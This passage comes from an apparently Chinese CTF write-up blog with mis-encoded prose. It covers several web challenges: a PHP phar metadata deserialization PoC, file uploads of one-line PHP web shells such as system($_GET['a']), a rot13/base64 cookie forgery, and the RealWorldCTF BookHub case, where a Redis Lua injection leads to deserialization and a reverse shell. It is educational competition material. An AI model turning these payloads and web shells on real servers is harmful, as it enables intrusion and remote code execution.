invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>) )</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/gif&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span> . <span class="string">&quot;/avatar.gif&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mode</span> = <span class="variable">$_GET</span>[<span class="string">&quot;m&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;upload&quot;</span>)</span><br><span class="line">        <span class="title function_ invoke__">upload</span>(<span class="title function_ invoke__">check_session</span>());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span> == <span class="string">&quot;show&quot;</span>)</span><br><span class="line">        <span class="title function_ invoke__">show</span>(<span class="title function_ invoke__">check_session</span>());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹ä»£ç ,å‘ç°æ˜¯ä¸ªååºåˆ—åŒ–çš„é¢˜,ä»”ç»†åˆ†æä¸€ä¸‹,é¦–å…ˆå‘ç°<code>check_session()</code>ä¸­æœ‰ä¸ªååºåˆ—åŒ–,ä¸è¿‡å‰é¢æœ‰ä¸¤ä¸ªåˆ¤æ–­,å³å¯¹dataè¿›è¡Œå¯†é’¥hashç„¶ååˆ¤æ–­,å¦‚æœä¸åŒåˆ™ç›´æ¥<code>die</code>,ç„¶è€Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“secret,æ‰€ä»¥è¿™é‡Œçš„ååºåˆ—åŒ–å¹¶æ²¡æœ‰ç”¨ é‚£ä¹ˆæ”»å‡»ç‚¹æ˜¯ä»€ä¹ˆå‘¢?è¿™é‡Œæ˜¯orangeçš„ä¸€ä¸ª0day</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpåœ¨è§£æpharå¯¹è±¡çš„æ—¶å€™ä¼šååºåˆ—åŒ–metadata</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$argv</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;phar://./deser.phar&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hui</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;PWN\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;deser.phar&#x27;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/deser.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$p</span>[<span class="string">&#x27;file.txt&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Hui</span>());</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Could not create and/or modify phar:&#x27;</span>, <span class="variable">$e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æå‰æŠŠphp.inié‡Œé¢çš„pharçš„readonlyæ”¹æˆoff,ä¸ç„¶ä¼šåˆ›å»ºå¤±è´¥ åº•å±‚ä»£ç <a href="https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609" title="https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609">https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609</a> <img src="/images/2018/08/ichunqiu-9.jpg" alt="blacsheep" /> å½“ç”¨<code>phar://</code>åè®®è¯»å–æ–‡ä»¶çš„æ—¶å€™,æ–‡ä»¶å†…å®¹ä¼šè¢«è§£ææˆ<code>pharå¯¹è±¡</code>,ç„¶åpharå¯¹è±¡ä¸­çš„metadataååºåˆ—åŒ–,ä¹Ÿå°±èƒ½æ„é€ ä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„ç±»äº† ç»™ä¸€ä¸ªpå¸ˆå‚…çš„poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span> = <span class="string">&#x27;orz&#x27;</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;file.php&#x27;</span>] = <span class="string">&#x27;&lt;?php ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Admin</span>());</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ å‡ºååºåˆ—åŒ–çš„adminå¯¹è±¡ä¹‹å,æ–°çš„é—®é¢˜æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$FLAG</span>    = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>create_function</code>æ²¡æœ‰å‡½æ•°åç§°,æ‰€ä»¥è¢«è®¾ç½®æˆäº†<code>\x00lambda_%d</code>è¿™é‡Œçš„%dæ¯æ¬¡+=1 ä¸è¿‡è¿™é‡Œ%dä¼šä¸€ç›´å¢å¤§åˆ°æœ€å¤§é•¿åº¦ç›´åˆ°ç»“æŸ,æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤§é‡è¯·æ±‚è®©pre-forkæ¨¡å¼å¯åŠ¨ä»è€Œåˆ›å»ºæ–°çš„çº¿ç¨‹,è¿™æ ·%då°±è¢«åˆ·æ–°ä¸º1äº†,é‚£ä¹ˆå°±æˆåŠŸé¢„æµ‹äº† æ•´ä¸ªæ”»å‡»è¿‡ç¨‹ é¦–å…ˆè¿è¡Œè„šæœ¬ç”Ÿæˆä¸€ä¸ªavataræ–‡ä»¶,å…¶ä¸­çš„metadataè®¾ç½®æˆè¦ååºåˆ—åŒ–çš„ç±»,ç”Ÿæˆä¸€ä¸ªavatar.gif,æ”¾åˆ°æœåŠ¡å™¨ä¸Š,ç„¶åuploadä¸Šå» <img src="/images/2018/08/ichunqiu-10.jpg" alt="blacsheep" /> ç„¶åæµ‹è¯•ä¸€ä¸‹phpinfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.50.3.97:8005/?m=upload&amp;url=phar:///var/www/data/bc571eef5a23ff081aa7adc9b5f43d08&amp;lucky=phpinfo</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ <img src="/images/2018/08/ichunqiu-11.jpg" alt="blacsheep" /> é‚£ä¹ˆå‡½æ•°è®¾ç½®æˆ<code>%00lambda_1</code>ç„¶åå¼€å¤šçº¿ç¨‹è¯·æ±‚ <img src="/images/2018/08/ichunqiu-12.jpg" alt="blacsheep" /> æ‹¿åˆ°flag</p><h2 id="ç¬¬ä¸‰å±Šç™¾è¶Šæ¯ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›">ç¬¬ä¸‰å±Šâ€œç™¾è¶Šæ¯â€ç¦å»ºçœé«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨å¤§èµ›</h2><h3 id="do-you-know-upload">Do you know uploadï¼Ÿ</h3><p>è¿›å»å‘ç°æ˜¯ä¸ªä¸Šä¼ é¡µé¢,å°è¯•hitconçš„avatar.gifå‘ç°ä¸Šä¼ æˆåŠŸ,ç„¶è€Œé‡Œé¢æœ‰phpçš„ä»£ç ,äºæ˜¯æ”¹æˆä¸€å¥è¯,burpæŠ“åŒ…æ”¹åç¼€ä¸Šä¼ å‘ç°ä¸Šä¼ æˆåŠŸ <img src="/images/2018/08/ichunqiu-13.jpg" alt="blacsheep" /> å‘ç°å±…ç„¶è¿˜æœ‰ä¸ªåŒ…å«æ¼æ´,ä¸è¿‡æ— æ‰€è°“äº†,æŸ¥çœ‹ä¸€ä¸‹2.php,å‘ç°æˆåŠŸè§£æ,å°±ç›´æ¥getshelläº† è¿›å»å‘ç°config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;ctfctfctf&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;ctf&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿æ¥æ•°æ®åº“,å‘ç°flag <img src="/images/2018/08/ichunqiu-14.jpg" alt="blacsheep" /></p><h2 id="ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›">2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›</h2><h3 id="broken">broken</h3><p>è¿›å»å‘ç°jsfucké¡µé¢,å¤åˆ¶è§£å¯†,å‘ç°é”™è¯¯,checkä¸€ä¸‹,å‘ç°å°‘äº†ä¸€ä¸ª<code>]</code>,æ·»åŠ ä¸Šå†è§£å¯†,å‘ç°è¿˜æ˜¯æŠ¥é”™,ç±»å‹é”™è¯¯,å¹¶ä¸æ˜¯å‡½æ•°,é‚£ä¹ˆå»æ‰æœ€åçš„ä¸¤ä¸ªæ‹¬å·,å†è§£å¯†,å¾—åˆ°ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;var flag=&quot;flag&#123;f_f_l_u_a_c_g_k&#125;&quot;;alert(&#x27;flag is not here&#x27;);&quot;]</span><br></pre></td></tr></table></figure><p>å³æ‹¿åˆ°flag</p><h3 id="who-are-you">who are you</h3><p>è¿›å»å‘ç°no permissions çœ‹ä¸‹cookie,å‘ç°<code>Zjo1OiJ0aHJmZyI7</code> baseè§£ä¸€ä¸‹,å‘ç°æ˜¯<code>f:5:"thrfg";</code> ç„¶åthrfgæ˜¯guestçš„rot13,é‚£ä¹ˆæŠŠadminçš„rot13ä¼ è¿›å»ç„¶åbaseä¸€ä¸‹è¿›å»å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]; --&gt;Hello admin, now you can upload something you are easy to forget.&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=1.php&amp;data=&lt;?php system($_GET[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.75.72.168:2222/uploads/1.php</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e07cd440-8eed-11e7-997d-7efc09eb6c59&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RealWorldCTFå­¦ä¹ </title>
      <link href="/2018/08/10/realworldctf%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/08/10/realworldctf%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>é•¿äº­å‡ºé¢˜,å¯¹ä¸èµ·ç­¾åˆ°å¤±è´¥.. ä½†ä¸ç®¡æ€ä¹ˆè¯´å­¦ä¹ ä¸€ä¸‹å§,ç®€å•è®°å½•ä¸¤é“é¢˜</p><h2 id="advertisement">Advertisement</h2><p><img src="/images/2018/08/rwctf-1.jpg" alt="blacsheep" /> ç„¶åå°è¯•æ‰«ç›®å½• å‘ç°<a href="https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip" title="https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip">https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip</a> ç„¶åæ‹¿åˆ°flag <img src="/images/2018/08/rwctf-2.jpg" alt="blacsheep" /> å½“ç„¶è¿˜æœ‰å¯¹uidè¿›è¡Œæ³¨å…¥ç„¶åæ‹¿åˆ°flagçš„..åæ­£å¤§æ¦‚å°±æ˜¯è¦æœ‰æ—¥å¹³å°çš„å¿ƒæ€å’¯..</p><h2 id="bookhub">BookHub</h2><p><img src="/images/2018/08/rwctf-3.png" alt="blacsheep" /> å»æ‹¿ä¸€ä¸‹æºç ,å‘ç°æ˜¯flaskæ¡†æ¶ ç„¶åå‘ç°view/user.pyé‡Œé¢æœ‰ä¸€æ®µeval,çŒœæµ‹ä»£ç æ‰§è¡Œ ä¸è¿‡éœ€è¦ç™»å½•,æŸ¥çœ‹ç™»å½•ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@user_blueprint.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    form = LoginForm(data=flask.request.data)</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.username.data).first()</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;book.admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;login.html&#x27;</span>, form=form)</span><br></pre></td></tr></table></figure><p>ç„¶åå»è·ŸLoginForm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    username = StringField(<span class="string">&#x27;username&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(<span class="string">&#x27;password&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    remember_me = BooleanField(<span class="string">&#x27;remember_me&#x27;</span>, default=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_password</span>(<span class="params">self, field</span>):</span><br><span class="line">        address = get_remote_addr()</span><br><span class="line">        whitelist = os.environ.get(<span class="string">&#x27;WHITELIST_IPADDRESS&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If you are in the debug mode or from office network (developer)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> app.debug <span class="keyword">and</span> <span class="keyword">not</span> ip_address_in(address, whitelist):</span><br><span class="line">            <span class="keyword">raise</span> StopValidation(<span class="string">f&#x27;your ip address isn\&#x27;t in the <span class="subst">&#123;whitelist&#125;</span>.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        user = User.query.filter_by(username=self.username.data).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(field.data):</span><br><span class="line">            <span class="keyword">raise</span> StopValidation(<span class="string">&#x27;Username or password error.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå»çœ‹get_remote_addr()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_remote_addr</span>():</span><br><span class="line">    address = flask.request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>, flask.request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ipaddress.ip_address(address)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å»æ”¹xff,ä¸è¿‡å‘ç°å¹¶ä¸èƒ½é€šè¿‡ipéªŒè¯,çŒœæµ‹æ˜¯åšäº†ä¸€å±‚nginxåä»£è¿‡äº†xff ç„¶åçœ‹åˆ°ipé‡Œé¢æœ‰ä¸€ä¸ªå…¬ç½‘ip:18.213.16.123,æ‰«ç«¯å£å‘ç°5000ç«¯å£,ä¸Šå»ä¹‹åå‘ç°æ˜¯è°ƒè¯•æ¨¡å¼ <img src="/images/2018/08/rwctf-4.jpg" alt="blacsheep" /> ä½†æ˜¯å‘ç°å¯ä»¥refresh_session <img src="/images/2018/08/rwctf-5.jpg" alt="blacsheep" /> é‚£ä¹ˆæˆ‘ä»¬ç»§ç»­çœ‹åˆ°evalçš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">refresh_session</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        delete all session except the logined user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :return: json</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        status = <span class="string">&#x27;success&#x27;</span></span><br><span class="line">        sessionid = flask.session.sid</span><br><span class="line">        prefix = app.config[<span class="string">&#x27;SESSION_KEY_PREFIX&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flask.request.form.get(<span class="string">&#x27;submit&#x27;</span>, <span class="literal">None</span>) == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rds.<span class="built_in">eval</span>(<span class="string">rf&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                local function has_value (tab, val)</span></span><br><span class="line"><span class="string">                    for index, value in ipairs(tab) do</span></span><br><span class="line"><span class="string">                        if value == val then</span></span><br><span class="line"><span class="string">                            return true</span></span><br><span class="line"><span class="string">                        end</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    return false</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                local inputs = &#123;&#123; &quot;<span class="subst">&#123;prefix&#125;</span><span class="subst">&#123;sessionid&#125;</span>&quot; &#125;&#125;</span></span><br><span class="line"><span class="string">                local sessions = redis.call(&quot;keys&quot;, &quot;<span class="subst">&#123;prefix&#125;</span>*&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                for index, sid in ipairs(sessions) do</span></span><br><span class="line"><span class="string">                    if not has_value(inputs, sid) then</span></span><br><span class="line"><span class="string">                        redis.call(&quot;del&quot;, sid)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">except</span> redis.exceptions.ResponseError <span class="keyword">as</span> e:</span><br><span class="line">                app.logger.exception(e)</span><br><span class="line">                status = <span class="string">&#x27;fail&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(<span class="built_in">dict</span>(status=status))</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸ªredis+sessionçš„ååºåˆ—åŒ– å‚è€ƒæ–‡ç« :<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" title="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a> ç„¶åsessionidå¯æ§,è¿™é‡Œsessionidæ˜¯æ‹¼æ¥è¿›å»çš„,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å…¥æ¶æ„ä»£ç  æ¯”å¦‚å†™ä¸ªæµ‹è¯•è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prefix=<span class="string">&#x27;prefix&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;asijdoasijdoasji&quot;,evailcode,&quot;A&#x27;</span></span><br><span class="line">inputs=<span class="string">rf&#x27;&#123;&#123; &quot;<span class="subst">&#123;prefix&#125;</span><span class="subst">&#123;sessionid&#125;</span> &quot;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(inputs)</span><br><span class="line"><span class="comment"># &#123; &quot;prefixasijdoasijdoasji&quot;,evailcode,&quot;A &quot;&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥å†™å…¥æ®µevilä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis.call(&quot;set&quot;,&quot;bookhub:session:blacsheep&quot;,åºåˆ—åŒ–ä¹‹åçš„æ¶æ„ä»£ç )</span><br></pre></td></tr></table></figure><p>ç„¶åæ”¹sessionidä¸ºblacsheepçš„æ—¶å€™å°±å›å»ååºåˆ—åŒ–æ¶æ„ä»£ç ,ç„¶åè§¦å‘åå¼¹shell ç»™ä¸ªchamd5çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td 